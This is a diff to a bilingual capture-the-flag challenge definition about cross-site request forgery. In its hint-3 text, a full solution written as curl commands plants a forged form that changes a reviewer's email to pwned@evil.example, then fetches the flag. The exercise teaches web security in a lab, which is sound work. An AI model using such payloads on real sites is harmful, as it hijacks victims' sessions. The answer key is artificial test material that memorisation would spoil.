@@ -8,9 +8,9 @@
   "difficulty": 2,
   "estimatedDuration": "30 分",
   "track": {
-    "id": "absolute-beginner-to-stackstack",
-    "order": 60,
-    "chapter": "3. Browser attacks / ブラウザの攻撃"
+    "id": "ipa-web-security",
+    "order": 2,
+    "chapter": "IPA §1.6 CSRF"
   },
   "shortDescription": "セキュリティ担当への「怪しいページの通報」窓口。担当が信じ込んで開いたページに、担当の権限で操作を実行させろ。",
   "instructions": "「通報」に投稿した内容を、 後でセキュリティ担当が確認する。 担当がそれを確認した瞬間に手に入る合言葉 (`TC{...}`) をこのポータルに提出せよ。\n\n通報の投稿・巡回のリクエスト・レビュー状況の確認、 この 3 つの操作はどれも自分の手で行う必要がある (担当は自動では巡回しない)。\n\n手がかりが欲しくなったら、 下のヒントを開こう (ヒントにはスコアのペナルティが付く)。",
@@ -62,7 +62,7 @@
         },
         {
           "id": "hint-3",
-          "content": "Here is the full sequence. (1) `curl -s http://127.0.0.1:18080/report --data-urlencode 'html=<form action=\"/settings/email\" method=\"POST\"><input name=\"email\" value=\"pwned@evil.example\"></form>'` to report the auto-submitting form's HTML as-is. (2) `curl -s -X POST http://127.0.0.1:18080/admin/review-reports` to fire the security reviewer's review. (3) `curl -s http://127.0.0.1:18080/admin/notification-status` — `email` has changed and a `flag` field now holds the flag. Calling `/settings/email` yourself directly never works, because you never hold the reviewer's session — that is the whole point of this challenge."
+          "content": "Here is the full sequence. Set `BASE` to the access URL shown in the portal (`BASE=<access URL>`), then run: (1) `curl -s \"$BASE/report\" --data-urlencode 'html=<form action=\"/settings/email\" method=\"POST\"><input name=\"email\" value=\"pwned@evil.example\"></form>'` to report the auto-submitting form's HTML as-is. (2) `curl -s -X POST \"$BASE/admin/review-reports\"` to fire the security reviewer's review. (3) `curl -s \"$BASE/admin/notification-status\"` — `email` has changed and a `flag` field now holds the flag. Calling `/settings/email` yourself directly never works, because you never hold the reviewer's session — that is the whole point of this challenge."
         }
       ]
     }
@@ -96,7 +96,7 @@
       },
       {
         "id": "hint-3",
-        "content": "手順をすべて示す。 (1) `curl -s http://127.0.0.1:18080/report --data-urlencode 'html=<form action=\"/settings/email\" method=\"POST\"><input name=\"email\" value=\"pwned@evil.example\"></form>'` で、 自動送信フォームの HTML をそのまま通報する。 (2) `curl -s -X POST http://127.0.0.1:18080/admin/review-reports` でセキュリティ担当のレビューを発火させる。 (3) `curl -s http://127.0.0.1:18080/admin/notification-status` を確認すると `email` が書き換わり、 `flag` フィールドにフラグが入っている。 `/settings/email` を自分で直接叩いても、 担当のセッションを持っていないため成功しない ── それこそがこの問題の核心だ。",
+        "content": "手順をすべて示す。 ポータルに表示されている **アクセス先 URL** を `BASE` に控えてから実行する (`BASE=<アクセス先 URL>`)。 (1) `curl -s \"$BASE/report\" --data-urlencode 'html=<form action=\"/settings/email\" method=\"POST\"><input name=\"email\" value=\"pwned@evil.example\"></form>'` で、 自動送信フォームの HTML をそのまま通報する。 (2) `curl -s -X POST \"$BASE/admin/review-reports\"` でセキュリティ担当のレビューを発火させる。 (3) `curl -s \"$BASE/admin/notification-status\"` を確認すると `email` が書き換わり、 `flag` フィールドにフラグが入っている。 `/settings/email` を自分で直接叩いても、 担当のセッションを持っていないため成功しない ── それこそがこの問題の核心だ。",
         "penalty": 25
       }
     ]
